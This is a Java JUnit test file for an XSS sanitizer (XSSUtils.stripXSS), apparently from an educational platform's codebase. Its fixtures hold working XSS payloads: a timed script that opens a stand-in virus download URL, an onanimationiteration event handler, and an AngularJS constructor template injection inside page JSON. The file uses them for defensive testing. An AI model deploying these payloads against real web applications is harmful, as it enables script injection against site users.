package io.edifice.xss;

import static org.junit.Assert.assertEquals;
import static org.owasp.html.AntiSamyTest.assertSanitizedDoesNotContain;

import org.junit.Test;

public class XSSUtilsTests {

    @Test
    public void iw263Test() {
        final String content =
                "<script>\n" + //
                "setTimeout(() => {\n" + //
                "window.open(\"https://www.my_virus_exemple.com\",\"_blank\"); //pour telecharger le virus ou alert(1);\n" + //
                "},3000); /// il faut attendre 3s car je veux engresistrer cette frises\n" + //
                "</script>";
        final String resContent = XSSUtils.stripXSS(content);
        System.out.println(resContent);
        assertEquals("", resContent);
    }

    @Test
    public void iw270Test() {
        final String content = "<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></xss>";
        final String resContent = XSSUtils.stripXSS(content);
        System.out.println(resContent);
        assertSanitizedDoesNotContain(resContent, "onanimationiteration");

        final String payload = "{\"name\":\"<style>@keyframes slidein {}</style><xss style=\\\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\\\" onanimationiteration=\\\"alert(1)\\\"></xss>\"}";
        final String resPayload = XSSUtils.stripXSS(payload);
        System.out.println(resPayload);
        assertSanitizedDoesNotContain(resPayload, "onanimationiteration");
    }

    @Test
    public void iw271Test() {
        final String content = "[[$on.constructor('alert(1)')()]]";
        final String resContent = XSSUtils.stripXSS(content);
        System.out.println(resContent);
        assertSanitizedDoesNotContain(resContent, content);

        final String payload = "{\"title\":\"test xss\",\"pages\":[{\"title\":\"Page d'accueil\",\"titleLink\":\"pagedaccueil\",\"href\":\"/pages#/website/85c51e81-b7b9-4fff-8d46-217e9e040263/pagedaccueil\",\"rows\":[{\"cells\":[{\"width\":3,\"index\":0,\"media\":{\"source\":{\"template\":\"navigation\",\"application\":\"pages\",\"source\":{\"_id\":\"85c51e81-b7b9-4fff-8d46-217e9e040263\",\"landingPage\":\"pagedaccueil\"}},\"type\":\"sniplet\"},\"style\":{}},{\"width\":9,\"index\":1,\"media\":{\"source\":\"<h1 class=\\\"ng-scope\\\">Construisez votre page</h1>\\n" + //
                        "<ul class=\\\"ng-scope\\\">\\n" + //
                        "    <li>Vous pouvez entrer ici les informations que vous voulez : cliquez dans un encart de texte comme celui-ci pour en modifier le contenu.​</li>\\n" + //
                        "</ul>\\n" + //
                        "<div>​</div>\\n" + //
                        "<div>​</div>\\n" + //
                        "<div>​<span style=\\\"background-color: rgb(34, 39, 43); color: rgba(0, 0, 0, 0); font-family: sans-serif; font-size: 17.7833px;\\\">[[$on.constructor('alert(1)')()]]</span>\\n" + //
                        "    <br>\\n" + //
                        "</div>\\n" + //
                        "<ul class=\\\"ng-scope\\\">\\n" + //
                        "    <li>Utilisez le menu sur la droite de l'application pour glisser-déposer du contenu dans votre page.</li>\\n" + //
                        "</ul>\\n" + //
                        "<hr class=\\\"ng-scope\\\">\\n" + //
                        "<div class=\\\"row ng-scope\\\">\\n" + //
                        "    <video style=\\\"max-width: 70%; display: block; margin: auto\\\" controls=\\\"\\\" src=\\\"/pages/public/tutorial.mp4\\\"></video>\\n" + //
                        "</div>\\n" + //
                        "<hr class=\\\"ng-scope\\\">\\n" + //
                        "<h1 class=\\\"ng-scope\\\">Naviguez dans votre page</h1>\\n" + //
                        "<ul class=\\\"ng-scope\\\">\\n" + //
                        "    <li>La navigation de gauche sera complétée automatiquement au fur et à mesure que vous ajouterez des pages.​</li>\\n" + //
                        "    <li>Vous avez la possibilité de publier ou dé-publier votre page à tout moment de son édition afin d'en contrôler la visibilité.</li>\\n" + //
                        "</ul>\",\"type\":\"text\"},\"style\":{}}]}],\"published\":true,\"owner\":\"91c22b66-ba1b-4fde-a3fe-95219cc18d4a\"}],\"landingPage\":\"pagedaccueil\",\"referencedResources\":{\"pages\":[]},\"visibility\":\"PRIVATE\"}";
        final String resPayload = XSSUtils.stripXSS(payload);
        System.out.println(resPayload);
        assertSanitizedDoesNotContain(resPayload, content);

        final String safePayload1 = "{\n" + //
                        "  \"school\": {\n" + //
                        "    \"name\": \"Sunrise High School\",\n" + //
                        "    \"location\": \"Downtown City\",\n" + //
                        "    \"students\": [\n" + //
                        "      {\n" + //
                        "        \"id\": 1,\n" + //
                        "        \"name\": \"Alice\",\n" + //
                        "        \"age\": 15,\n" + //
                        "        \"grades\": {\n" + //
                        "          \"math\": 95,\n" + //
                        "          \"science\": 89,\n" + //
                        "          \"history\": 92\n" + //
                        "        },\n" + //
                        "        \"activities\": [\"basketball\", \"chess club\"]\n" + //
                        "      },\n" + //
                        "      {\n" + //
                        "        \"id\": 2,\n" + //
                        "        \"name\": \"Bob\",\n" + //
                        "        \"age\": 16,\n" + //
                        "        \"grades\": {\n" + //
                        "          \"math\": 78,\n" + //
                        "          \"science\": 85,\n" + //
                        "          \"history\": 80\n" + //
                        "        },\n" + //
                        "        \"activities\": [\"soccer\", \"band\"]\n" + //
                        "      }\n" + //
                        "    ],\n" + //
                        "    \"teachers\": [\n" + //
                        "      {\n" + //
                        "        \"id\": 101,\n" + //
                        "        \"name\": \"Mr. Smith\",\n" + //
                        "        \"subject\": \"Math\",\n" + //
                        "        \"classes\": [\"Algebra\", \"Calculus\"]\n" + //
                        "      },\n" + //
                        "      {\n" + //
                        "        \"id\": 102,\n" + //
                        "        \"name\": \"Ms. Johnson\",\n" + //
                        "        \"subject\": \"Science\",\n" + //
                        "        \"classes\": [\"Biology\", \"Physics\"]\n" + //
                        "      }\n" + //
                        "    ]\n" + //
                        "  }\n" + //
                        "}\n" + //
                        "";
        final String resSafePayload1 = XSSUtils.stripXSS(safePayload1);
        assertEquals(safePayload1, resSafePayload1);

        final String safePayload2 = "{\n" + //
                        "  \"company\": {\n" + //
                        "    \"name\": \"Tech Innovators Inc.\",\n" + //
                        "    \"departments\": [\n" + //
                        "      {\n" + //
                        "        \"name\": \"Engineering\",\n" + //
                        "        \"teams\": [\n" + //
                        "          [\n" + //
                        "            {\n" + //
                        "              \"teamName\": \"Backend Team\",\n" + //
                        "              \"members\": [\n" + //
                        "                { \"name\": \"Alice\", \"role\": \"Lead Developer\" },\n" + //
                        "                { \"name\": \"Bob\", \"role\": \"Software Engineer\" }\n" + //
                        "              ]\n" + //
                        "            },\n" + //
                        "            {\n" + //
                        "              \"teamName\": \"Frontend Team\",\n" + //
                        "              \"members\": [\n" + //
                        "                { \"name\": \"Charlie\", \"role\": \"UI/UX Designer\" },\n" + //
                        "                { \"name\": \"Dave\", \"role\": \"Frontend Developer\" }\n" + //
                        "              ]\n" + //
                        "            }\n" + //
                        "          ],\n" + //
                        "          [\n" + //
                        "            {\n" + //
                        "              \"teamName\": \"DevOps Team\",\n" + //
                        "              \"members\": [\n" + //
                        "                { \"name\": \"Eve\", \"role\": \"DevOps Engineer\" },\n" + //
                        "                { \"name\": \"Frank\", \"role\": \"Cloud Specialist\" }\n" + //
                        "              ]\n" + //
                        "            },\n" + //
                        "            {\n" + //
                        "              \"teamName\": \"QA Team\",\n" + //
                        "              \"members\": [\n" + //
                        "                { \"name\": \"Grace\", \"role\": \"QA Analyst\" },\n" + //
                        "                { \"name\": \"Heidi\", \"role\": \"Automation Tester\" }\n" + //
                        "              ]\n" + //
                        "            }\n" + //
                        "          ]\n" + //
                        "        ]\n" + //
                        "      },\n" + //
                        "      {\n" + //
                        "        \"name\": \"Marketing\",\n" + //
                        "        \"teams\": [\n" + //
                        "          [\n" + //
                        "            {\n" + //
                        "              \"teamName\": \"Content Team\",\n" + //
                        "              \"members\": [\n" + //
                        "                { \"name\": \"Ivy\", \"role\": \"Content Writer\" },\n" + //
                        "                { \"name\": \"Jack\", \"role\": \"SEO Specialist\" }\n" + //
                        "              ]\n" + //
                        "            },\n" + //
                        "            {\n" + //
                        "              \"teamName\": \"Social Media Team\",\n" + //
                        "              \"members\": [\n" + //
                        "                { \"name\": \"Kate\", \"role\": \"Social Media Manager\" },\n" + //
                        "                { \"name\": \"Leo\", \"role\": \"Community Manager\" }\n" + //
                        "              ]\n" + //
                        "            }\n" + //
                        "          ]\n" + //
                        "        ]\n" + //
                        "      }\n" + //
                        "    ]\n" + //
                        "  }\n" + //
                        "}\n" + //
                        "";
        final String resSafePayload2 = XSSUtils.stripXSS(safePayload2);
        assertEquals(safePayload2, resSafePayload2);
    }

}
